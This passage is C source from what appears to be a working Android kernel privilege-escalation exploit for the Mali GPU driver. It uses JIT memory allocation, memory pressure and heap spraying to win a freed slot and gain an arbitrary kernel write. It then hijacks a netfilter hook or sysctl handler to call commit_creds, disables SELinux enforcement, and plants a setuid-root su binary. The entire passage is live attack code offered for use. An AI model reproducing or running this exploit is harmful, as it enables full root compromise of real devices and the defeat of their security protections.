		LOG("[-] ufake mmap: %s\n", strerror(errno));
		return 1;
	}
	if (pmap) {
		S_VAL = PM_G;      /* cpu_alloc = gpu_alloc = physmap fake */
	}
	if (argc > 4 && !nf_fakecred)
		S_VAL = (uint32_t)strtoul(argv[4], NULL, 0);
	LOG("[+] fake S=%#x\n", S_VAL);
	/* payload names: two variants (filler differs at name[39]) so toggling
	 * always renames to a payload name */
	build_name(tog[0][0], n_val, p_val);
	memcpy(tog[0][1], tog[0][0], NAMELEN + 1);
	tog[0][1][39] = 'B';
	for (int i = 1; i < NTOGGL; i++) {
		memcpy(tog[i][0], tog[0][0], NAMELEN + 1);
		memcpy(tog[i][1], tog[0][1], NAMELEN + 1);
		tog[i][0][40] = 'a' + (i % 26);
		tog[i][1][40] = 'a' + (i % 26);
	}
	/* scratch names for CREATE/DELETE waves */
	memcpy(tog2[0], tog[0][0], NAMELEN + 1);
	tog2[0][39] = 'C';
	for (int i = 1; i < NTOGGL; i++) {
		memcpy(tog2[i], tog2[0], NAMELEN + 1);
		tog2[i][40] = 'a' + (i % 26);
	}

	LOG("[*] stage3 mode=%s pressure=%dMB N=%#x P=%#x\n", argv[1], pmb, n_val, p_val);

	int ifd = inotify_setup();
	if (ifd < 0) return 1;
	LOG("[+] inotify watching %s\n", wdir);

	/* gpu context */
	fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
	if (fd < 0) { LOG("[-] mali0: %s\n", strerror(errno)); return 1; }
	struct version_check vc = { BASE_UK_VERSION_MAJOR, BASE_UK_VERSION_MINOR };
	if (ioctl(fd, IOCTL_VERSION_CHECK, &vc) != 0) { LOG("[-] handshake\n"); return 1; }
	struct set_flags_s sf = { 0 };
	ioctl(fd, IOCTL_SET_FLAGS, &sf);
	void *track = mmap(NULL, 4096, PROT_NONE, MAP_SHARED, fd, 3ull << 12);
	if (track == MAP_FAILED) { LOG("[-] track mmap\n"); return 1; }

	union mem_alloc_u ma;
	memset(&ma, 0, sizeof(ma));
	ma.in.va_pages = 1;
	ma.in.commit_pages = 1;
	ma.in.flags = MEM_PROT;
	if (ioctl(fd, IOCTL_MEM_ALLOC, &ma) != 0) { LOG("[-] scratch alloc\n"); return 1; }
	uint64_t scratch = ma.out.gpu_addr;
	void *scratch_cpu = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, scratch);
	if (scratch_cpu == MAP_FAILED) { LOG("[-] scratch mmap\n"); return 1; }
	*(volatile uint64_t *)scratch_cpu = 0;

	struct mem_jit_init_s ji;
	memset(&ji, 0, sizeof(ji));
	ji.va_pages = 0x1000;
	ji.max_allocations = 64;
	if (ioctl(fd, IOCTL_MEM_JIT_INIT, &ji) != 0) { LOG("[-] jit init\n"); return 1; }

	if (pmap)
		kbm_spray();   /* needs fd; lowmem-pinned physmap pattern */

	struct jit_alloc_info info;
	memset(&info, 0, sizeof(info));
	info.gpu_alloc_addr = scratch;
	info.va_pages = 0x40;
	info.commit_pages = 0x10;
	info.extent = 0x10;
	info.id = 1;
	info.bin_id = 1;
	struct atom_v2 a;
	memset(&a, 0, sizeof(a));
	a.jc = (uint64_t)(uintptr_t)&info;
	a.nr_extres = 1;
	a.atom_number = 1;
	a.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
	if (submit_atom(&a) != 0) { LOG("[-] jit alloc submit\n"); return 1; }
	sleep(1);
	uint64_t jit_va = *(volatile uint64_t *)scratch_cpu;
	LOG("[+] jit id=1 va=0x%llx\n", (unsigned long long)jit_va);
	if (!jit_va) { LOG("[-] alloc failed\n"); return 1; }

	struct mem_flags_change_s fc = { jit_va, BASE_MEM_DONT_NEED, BASE_MEM_DONT_NEED };
	if (ioctl(fd, IOCTL_MEM_FLAGS_CHANGE, &fc) != 0) { LOG("[-] DONT_NEED\n"); return 1; }

	if (drain || weapon) {
		/* drain AFTER jit alloc: fills all sibling slots in the victim's
		 * slab so the later free makes it the sole free slot of a full slab */
		for (int i = 0; i < 100000 && spray_renames < ndrain; i++)
			spray_wave();
		LOG("[+] pre-drain: %d renames -> ~%d events held\n",
		    spray_renames, spray_renames * n_ifd);
	}

	/* pressure; stepped variant uses small children with poll-and-kill */
	LOG("[*] pressure...\n");
	pthread_t pre_th[4];
	int pre_spawned = 0;
	if (stepped) {
		int evicted = 0;
		pid_t kids[16];
		int nk = 0;
		for (int step = 0; step < pmb / 100 && !evicted && nk < 16; step++) {
			pid_t child = fork();
			if (child == 0) {
				cpu_set_t set;
				CPU_ZERO(&set);
				CPU_SET(0, &set);
				sched_setaffinity(0, sizeof(set), &set);
				for (int i = 0; i < 100 / 16; i++) {
					void *m = mmap(NULL, 16UL << 20, PROT_READ | PROT_WRITE,
							MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
					if (m == MAP_FAILED)
						break;
				}
				/* hold the memory so pressure accumulates */
				sleep(600);
				_exit(0);
			}
			kids[nk++] = child;
			for (int i = 0; i < 3000; i++) {
				usleep(1000);
				long q = query_commit(jit_va);
				if (q <= 0) { evicted = 1; break; }
			}
		}
		if (evicted && overlap_kill) {
			/* allocations FIRST, cleanup second: the trailing threads
			 * race for the freed slot while we kill the kids */
			spray_stop = 0;
			for (int c = 0; c < 4; c++)
				pthread_create(&pre_th[c], NULL, spray_thread, (void *)(intptr_t)c);
			pre_spawned = 1;
		}
		for (int i = 0; i < nk; i++) {
			kill(kids[i], SIGKILL);
			waitpid(kids[i], NULL, 0);
		}
		LOG("[+] stepped pressure done, evicted=%d query=%ld\n",
		    evicted, query_commit(jit_va));
	} else {
	pid_t child = fork();
	if (child == 0) {
		cpu_set_t set;
		CPU_ZERO(&set);
		CPU_SET(0, &set);
		sched_setaffinity(0, sizeof(set), &set);
		for (int i = 0; i < pmb / 16; i++) {
			void *m = mmap(NULL, 16UL << 20, PROT_READ | PROT_WRITE,
					MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
			if (m == MAP_FAILED)
				break;
		}
		_exit(0);
	}
	int evicted = 0;
	if (kill_at_evict) {
		for (int i = 0; i < 3000; i++) {
			usleep(10000);
			long q = query_commit(jit_va);
			if (q == 0) { evicted = 1; break; }
			if (q < 0) { evicted = 1; break; }
			pid_t w = waitpid(child, NULL, WNOHANG);
			if (w == child) break;
		}
		if (evicted) {
			kill(child, SIGKILL);
			waitpid(child, NULL, 0);
			LOG("[+] eviction observed mid-pressure (query=%ld), child killed\n",
			    query_commit(jit_va));
		} else {
			waitpid(child, NULL, 0);
			LOG("[*] pressure ended without observed eviction (query=%ld)\n",
			    query_commit(jit_va));
		}
	} else {
		int st;
		waitpid(child, &st, 0);
	}
	} /* non-stepped */
	if (!overlap_kill && !iso && !pmap)
		usleep(300000);

	if (pmap && pm_base)
		physmap_retouch();

	if (mix) {
		/* SEQUENTIAL isolation: events get 2s EXCLUSIVE trailing, stop,
		 * then regions. No CPU contention.
		 *  - survive + nodename change -> EVENT took the slot (write!)
		 *  - oracle region hit          -> events lost (¬A confirmed)
		 *  - crash                      -> garbage or G-miss */
		LOG("[*] mix: event threads, 2s exclusive...\n");
		spray_stop = 0;
		int ev0 = spray_renames;
		pthread_t eth[4];
		for (int c = 0; c < 4; c++)
			pthread_create(&eth[c], NULL, spray_thread, (void *)(intptr_t)c);
		usleep(2000000);
		spray_stop = 1;
		for (int c = 0; c < 4; c++)
			pthread_join(eth[c], NULL);
		LOG("[+] events done: +%d renames\n", spray_renames - ev0);
		pthread_t rth[4];
		for (int c = 0; c < 4; c++)
			pthread_create(&rth[c], NULL, rspray_thread, (void *)(intptr_t)c);
		for (int i = 0; i < 100 && rspray_n < 2400; i++)
			usleep(50000);
		rspray_stop = 1;
		for (int c = 0; c < 4; c++)
			pthread_join(rth[c], NULL);
		LOG("[+] mix trailing: %d renames, %d regions\n",
		    spray_renames - ev0, rspray_n);
	} else if (iso) {
		/* ISOLATING EXPERIMENT: region trailing instead of events,
		 * same kill timing; stage-2 oracle decides if the slot was won */
		LOG("[*] iso: region trailing...\n");
		pthread_t th[4];
		for (int c = 0; c < 4; c++)
			pthread_create(&th[c], NULL, rspray_thread, (void *)(intptr_t)c);
		for (int i = 0; i < 200 && rspray_n < 3200; i++)
			usleep(50000);
		int rn = rspray_n;
		rspray_stop = 1;
		for (int c = 0; c < 4; c++)
			pthread_join(th[c], NULL);
		LOG("[+] iso: %d regions sprayed post-kill\n", rn);
	} else if (drain || weapon) {
		/* trailing take: multi-cpu threads sweep every per-cpu partial
		 * list; the victim's sole-free-slot slab is reached and payload'd */
		int before = spray_renames;
		if (pre_spawned) {
			for (int i = 0; i < 100 && spray_renames < before + 3200; i++)
				usleep(50000);
			spray_stop = 1;
			for (int c = 0; c < 4; c++)
				pthread_join(pre_th[c], NULL);
		} else if (stepped) {
			spray_stop = 0;
			pthread_t th[4];
			for (int c = 0; c < 4; c++)
				pthread_create(&th[c], NULL, spray_thread, (void *)(intptr_t)c);
			for (int i = 0; i < 100 && spray_renames < before + 3200; i++)
				usleep(50000);
			spray_stop = 1;
			for (int c = 0; c < 4; c++)
				pthread_join(th[c], NULL);
		} else {
			int target = pin_cpu0 ? before + 2000 : before + 128;
			for (int i = 0; i < 20000 && spray_renames < target; i++)
				spray_wave();
		}
		LOG("[+] trailing take: +%d renames -> %d total\n",
		    spray_renames - before, spray_renames);
	}

	/* capture BEFORE the free (the unlink mutates nodename in benign mode) */
	struct utsname u0;
	uname(&u0);
	char before[sizeof(u0.nodename)];
	strcpy(before, u0.nodename);

	LOG("[*] submitting JIT_FREE id=1 (unlink writes fire here)\n");
	uint8_t ids[2] = { 1, 0 };
	struct atom_v2 f;
	memset(&f, 0, sizeof(f));
	f.jc = (uint64_t)(uintptr_t)ids;
	f.nr_extres = 1;
	f.atom_number = 20;
	f.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
	if (submit_atom(&f) != 0)
		LOG("[-] free submit: %s\n", strerror(errno));
	usleep(200000);

	if (iso || mix) {
		/* stage-2 oracle: JIT_ALLOC(0x40, bin 0) must reuse the pool
		 * victim (== one of the post-kill sprayed regions) */
		struct jit_alloc_info o;
		memset(&o, 0, sizeof(o));
		o.gpu_alloc_addr = scratch;
		o.va_pages = 0x40;
		o.commit_pages = 0x10;
		o.extent = 0x10;
		o.id = 2;
		o.bin_id = 0;
		struct atom_v2 oa;
		memset(&oa, 0, sizeof(oa));
		oa.jc = (uint64_t)(uintptr_t)&o;
		oa.nr_extres = 1;
		oa.atom_number = 30;
		oa.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
		if (submit_atom(&oa) != 0) { LOG("[-] oracle submit: %s\n", strerror(errno)); return 1; }
		sleep(1);
		uint64_t got = *(volatile uint64_t *)scratch_cpu;
		int hit = -1;
		for (int i = 0; i < rspray_n && i < RSPRAY_MAX; i++)
			if (rspray_va[i] == got) { hit = i; break; }
		struct utsname u;
		uname(&u);
		int nhit = strcmp(u.nodename, before) != 0;
		LOG("[+] mix result: nodename %s | pool-oracle va=0x%llx %s\n",
		    nhit ? "CHANGED <<< EVENT WON - ARBITRARY WRITE WORKS" : "unchanged",
		    (unsigned long long)got,
		    hit >= 0 ? "(REGION took the slot - events lost a head-start race)"
		             : "(no sprayed region in pool)");
		if (iso) {
			close(fd);
			return 0;
		}
		pause();
		return 0;
	}

	if (!weapon) {
		struct utsname u;
		uname(&u);
		int hit = strcmp(u.nodename, before) != 0;
		LOG("[+] uname.nodename=\"%s\" (was \"%s\") %s\n", u.nodename, before,
		    hit ? "<<< ORACLE HIT - arbitrary write works" : "(unchanged - slot missed?)");
		LOG("[*] pausing (teardown unsafe while fake linked)\n");
		pause();
		return 0;
	}

	LOG("[*] triggering handler via /proc/sys/kernel/pid_max...\n");
	{
		struct utsname ud;
		uname(&ud);
		LOG("[+] post-free uname.nodename=\"%s\" (was \"%s\") %s\n",
		    ud.nodename, before,
		    strcmp(ud.nodename, before) ? "-> W1 FIRED (unlink ran)" : "-> W1 did not fire");
	}
	char buf[64];
	if (nfw) {
		uint32_t off;
		int reg = kbm_scan_for(HOOKS_PTR_ADDR, &off);
		nf_reg = reg;
		nf_pageoff = off;
		if (reg >= 0)
			LOG("[+] W1 CONFIRMED: region %d page+%#x <- %#x (reclaim + G hit!)\n",
			    reg, off, HOOKS_PTR_ADDR);
		else
			LOG("[*] W1 word not found in spray (reclaim missed or G page foreign)\n");
		if (argc > 3 && !strcmp(argv[3], "notrig")) {
			LOG("[*] notrig: pausing (cell hijacked, no packet)\n");
			pause();
			return 0;
		}
		/* trigger: any outbound IPv4 packet walks LOCAL_OUT hooks in the
		 * SENDER's task context -> our hookfn -> commit_creds */
		LOG("[*] nf: creating socket...\n");
		int s = socket(AF_INET, SOCK_DGRAM, 0);
		LOG("[*] nf: socket fd=%d errno=%d\n", s, errno);
		struct sockaddr_in dst = { 0 };
		dst.sin_family = AF_INET;
		dst.sin_port = htons(9);
		dst.sin_addr.s_addr = htonl(0x7f000001);
		char pkt[4] = "pwn";
		LOG("[*] nf: sending first packet...\n");
		if (nf_selroot && reg >= 0) {
			/* packet 1: zero selinux_state.enforcing (permissive) */
			sendto(s, pkt, 4, 0, (struct sockaddr *)&dst, sizeof(dst));
			/* rewrite the fake entry in place via our kbm CPU alias */
			char *ent = kbm_cpu[reg] + off;
			*(volatile uint32_t *)(ent + NF_CELL_OFF + 0x00) = 0;
			*(volatile uint32_t *)(ent + NF_CELL_OFF + 0x0c) = COMMIT_CREDS;
			*(volatile uint32_t *)(ent + NF_CELL_OFF + 0x14) = INIT_CRED;
			LOG("[+] selroot: enforcing cleared, entry -> commit_creds(&init_cred)\n");
		}
		for (int i = 0; i < 200; i++) {
			errno = 0;
			ssize_t r = sendto(s, pkt, 4, 0, (struct sockaddr *)&dst, sizeof(dst));
			LOG("[*] sendto %d -> %ld errno=%d uid=%d euid=%d\n",
			    i, (long)r, errno, getuid(), geteuid());
			if (geteuid() == 0 || getuid() == 0)
				break;
			usleep(50000);
		}
		close(s);
		LOG("[+] nf trigger done, uid=%d euid=%d %s\n", getuid(), geteuid(),
		    (geteuid() == 0 || getuid() == 0) ? "<<< HOOK RAN - commit_creds OK" : "(not root)");
	} else {
		int got_root = 0;
		for (int i = 0; i < 100 && !got_root; i++) {
			int rfd = open("/proc/sys/kernel/pid_max", O_RDONLY);
			if (rfd >= 0) {
				ssize_t r = read(rfd, buf, sizeof(buf) - 1);
				if (r > 0) buf[r] = 0; else buf[0] = 0;
				close(rfd);
				if (i == 0)
					LOG("[+] pid_max read 1: \"%s\"\n", buf);
				if (buf[0] == 0)
					LOG("[+] pid_max read EMPTY -> handler hijacked!\n");
			}
			if (geteuid() == 0 || getuid() == 0)
				got_root = 1;
			else
				usleep(50000);
		}
		(void)got_root;
	}

	if (geteuid() == 0 || getuid() == 0) {
		LOG("[+] ROOT: uid=%d euid=%d\n", getuid(), geteuid());
		/* disable SELinux (write "0" to enforce) */
		int ef = open("/sys/fs/selinux/enforce", O_WRONLY);
		if (ef >= 0) { int w = write(ef, "0", 1); LOG("[+] setenforce write=%d\n", w); close(ef); }
		/* install a real setuid-root su on a non-nosuid mount.
		 * /data/local/tmp/su_bin is pushed by run.sh.  /data/metrics is
		 * rw and neither nosuid nor noexec (verified). */
		const char *srcpath = "/data/local/tmp/su_bin";
		int in = open(srcpath, O_RDONLY);
		if (in < 0) { srcpath = "/system/bin/sh"; in = open(srcpath, O_RDONLY); }
		long total = 0;
		int out = open("/data/metrics/su", O_CREAT | O_WRONLY | O_TRUNC, 0755);
		if (in >= 0 && out >= 0) {
			char b[65536];
			ssize_t n;
			while ((n = read(in, b, sizeof(b))) > 0) {
				ssize_t off = 0;
				while (off < n) {
					ssize_t w = write(out, b + off, n - off);
					if (w <= 0) break;
					off += w;
				}
				total += n;
			}
			close(out);
			chown("/data/metrics/su", 0, 0);
			chmod("/data/metrics/su", 06755);
			/* let unprivileged users reach/execute it */
			chmod("/data/metrics", 0771);
			LOG("[+] su installed /data/metrics/su bytes=%ld (src=%s)\n",
			    total, srcpath);
		} else {
			LOG("[-] su install failed (in=%d out=%d)\n", in, out);
		}
		if (in >= 0) close(in);
		/* proof */
		int pf = open("/data/local/tmp/pwned", O_CREAT | O_WRONLY | O_TRUNC, 0644);
		if (pf >= 0) {
			char pb[160];
			int l = snprintf(pb, sizeof(pb), "uid=%d euid=%d su_bytes=%ld\n",
					 getuid(), geteuid(), total);
			write(pf, pb, l);
			close(pf);
		}
		LOG("[*] post-exploit complete; pausing (keep kctx alive)\n");
		/* optional post-root script, run with the full init_cred caps
		 * (a setuid su on Android gets uid 0 but *no* capabilities) */
		if (access("/data/local/tmp/rootcmd.sh", R_OK) == 0) {
			LOG("[*] running /data/local/tmp/rootcmd.sh\n");
			pid_t c = fork();
			if (c == 0) {
				char *av[] = { (char *)"/system/bin/sh",
					       (char *)"/data/local/tmp/rootcmd.sh", NULL };
				char *ev[] = { (char *)"PATH=/sbin:/system/bin:/system/xbin", NULL };
				execve("/system/bin/sh", av, ev);
				_exit(127);
			}
			int st = 0;
			waitpid(c, &st, 0);
			LOG("[+] rootcmd.sh exit status=%d\n", st);
		}
		if (nf_reg >= 0) {
			/* stop the hook from commit_creds()'ing every sender:
			 * make the fake entry a benign NF_ACCEPT stub */
			char *ent = kbm_cpu[nf_reg] + nf_pageoff;
			*(volatile uint32_t *)(ent + NF_CELL_OFF + 0x00) = 0;
			*(volatile uint32_t *)(ent + NF_CELL_OFF + 0x0c) = SAFE_FN;
			*(volatile uint32_t *)(ent + NF_CELL_OFF + 0x14) = 0;
			LOG("[+] hook entry -> benign SAFE_FN (net stable, su still works)\n");
		}
		pause();
	}
	LOG("[-] not root (uid=%d) - write missed or shellcode failed\n", getuid());
	LOG("[*] pausing\n");
	pause();
	return 0;
}
